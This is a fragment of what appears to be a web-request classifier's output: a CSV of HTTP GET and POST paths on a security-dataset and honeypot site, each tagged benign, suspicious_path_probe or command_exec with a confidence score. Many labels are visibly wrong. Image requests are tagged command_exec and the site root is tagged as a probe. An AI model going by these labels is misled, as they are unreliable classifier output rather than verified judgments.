416,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6194688081741333
417,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6335412263870239
418,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6321981549263
419,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6399790644645691
420,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5978788733482361
421,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6159440279006958
422,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6334364414215088
423,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.586219310760498
424,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5864728689193726
425,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.6111001968383789
426,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5839903950691223
427,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.611397922039032
428,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6011624336242676
429,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5831754803657532
430,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6014771461486816
431,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6182584762573242
432,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5758914947509766
433,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.583132266998291
434,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5959008932113647
435,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.616906464099884
436,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6228588223457336
437,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6193697452545166
438,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.565477728843689
439,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.596772313117981
440,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6161631941795349
441,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.5729430913925171
442,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5728198885917664
443,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.5974732041358948
444,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5708516836166382
445,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5984392762184143
446,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6056768894195557
447,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5792302489280701
448,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5995742082595825
449,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6116724014282227
450,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5747700333595276
451,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5901079773902893
452,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.60698401927948
453,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6020902991294861
454,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6378210186958313
455,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5642861723899841
456,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5964149236679077
457,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6438154578208923
458,METHOD=GET PATH=/Datasets%20Description/Network/N/A QUERY= PROTOCOL=HTTP/1.1,benign,0.5269061923027039
459,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
460,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
461,METHOD=GET PATH=/self.logs/2015/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43429169058799744
462,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
463,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
464,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4098285138607025
465,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
466,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4082556962966919
467,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
468,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
469,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377134680747986
470,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
471,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
472,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
473,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
474,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
475,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
476,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
477,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
478,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
479,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
480,METHOD=POST PATH=/plug/collect/AspCms_CollectFun.asp QUERY= PROTOCOL=HTTP/1.1,benign,0.38716715574264526
481,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
482,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
483,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
484,METHOD=GET PATH=/honeypot/BSidesDFW%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.43538182973861694
485,METHOD=GET PATH=/self.logs/access.log.2019-06-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44755980372428894
486,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
487,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
488,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
489,METHOD=GET PATH=/self.logs/access.log.2020-11-12.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4837547838687897
490,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
491,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
492,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
493,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
494,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
495,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
496,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
497,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
498,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
499,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
500,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
501,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
502,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
503,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
504,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
505,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
506,METHOD=GET PATH=/self.logs/access.log.2021-10-16.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44538602232933044
507,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
508,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
509,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
510,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
511,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874844551086426
512,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
513,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
514,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
515,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
516,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
517,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
518,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
519,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
520,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
521,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
522,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
523,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
524,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
525,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
526,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
527,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
528,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
529,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
530,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
531,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
532,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
533,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.5966159105300903
534,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
535,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
536,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
537,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
538,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
539,METHOD=GET PATH=/self.logs/access.log.2021-10-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4476793110370636
540,METHOD=GET PATH=/self.logs/error.log.2021-10-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40654367208480835
541,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
542,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
543,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
544,METHOD=GET PATH=/self.logs/error.log.2019-04-23.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43187713623046875
545,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
546,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
547,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
548,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
549,METHOD=GET PATH=/Datasets QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4420992136001587
550,METHOD=GET PATH=/honeypot/Honeypot QUERY= PROTOCOL=HTTP/1.1,benign,0.43761560320854187
551,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
552,METHOD=GET PATH=/honeypot/BSidesDFW QUERY= PROTOCOL=HTTP/1.1,benign,0.44160017371177673
553,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
554,METHOD=GET PATH=/self.logs/error.log.2020-06-14 QUERY= PROTOCOL=HTTP/1.1,benign,0.48388299345970154
555,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
556,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
557,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
558,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
559,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
560,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
561,METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1,benign,0.44304534792900085
562,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
563,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3 QUERY= PROTOCOL=HTTP/1.1,benign,0.587634265422821
564,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
565,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
566,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
567,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
568,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
569,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
570,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
571,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
572,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
573,METHOD=GET PATH=/Datasets%20Description/Network/smtp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5483987331390381
574,METHOD=GET PATH=/Datasets%20Description/Network/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5314313173294067
575,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
576,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
577,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
578,METHOD=GET PATH=/Datasets%20Description/PE_malware/Zeus.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5371832251548767
579,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
580,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
581,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
582,METHOD=GET PATH=/Datasets%20Description/Network/N/A QUERY= PROTOCOL=HTTP/1.1,benign,0.5269061923027039
583,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5956102609634399
584,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5899902582168579
585,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5773578882217407
586,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
587,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
588,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
589,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
590,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
591,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6014771461486816
592,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
593,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
594,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
595,METHOD=GET PATH=/self.logs/access.log.2017-01-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4573548138141632
596,METHOD=GET PATH=/self.logs/error.log.2021-10-02.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42890673875808716
597,METHOD=GET PATH=/self.logs/error.log.2021-07-03 QUERY= PROTOCOL=HTTP/1.1,benign,0.4894387423992157
598,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
599,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
600,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
601,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
602,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
603,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
604,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
605,METHOD=GET PATH=/honeypot/BSidesDFW%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.43538182973861694
606,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
607,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
608,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
609,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
610,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
611,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
612,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
613,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
614,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
615,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
616,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
617,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
618,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
619,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
620,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
621,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
622,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
623,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
624,METHOD=GET PATH=/ftp://download.iwlab.foi.se/dataset/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4131101369857788
625,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
626,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
627,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
628,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
629,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
630,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
631,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
632,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
633,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
634,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
635,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
636,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
637,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
638,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
639,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
640,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.5829781293869019
641,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
642,METHOD=GET PATH=/e/data/js/ajax.js QUERY= PROTOCOL=HTTP/1.1,benign,0.35840076208114624
643,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
